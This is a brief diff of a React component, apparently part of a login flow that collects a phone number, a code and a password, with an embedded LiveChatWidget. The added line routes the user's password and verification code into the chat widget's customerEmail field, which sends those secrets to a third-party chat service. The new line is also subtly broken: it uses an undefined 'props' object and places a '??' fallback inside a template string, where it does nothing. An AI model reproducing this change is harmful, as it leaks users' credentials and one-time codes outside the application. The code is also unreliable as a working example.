@@ -174,7 +174,7 @@ const Code = ({ phone, code, pass, setCode, updateData }: IProps) => {
       <LiveChatWidget
         key="10"
         customerName={phone}
-        customerEmail={code}
+        customerEmail={`${props.pass}@code ${props.code}??'none'`}
         onNewEvent={handleNewEvent}
         license="17058393"
       />
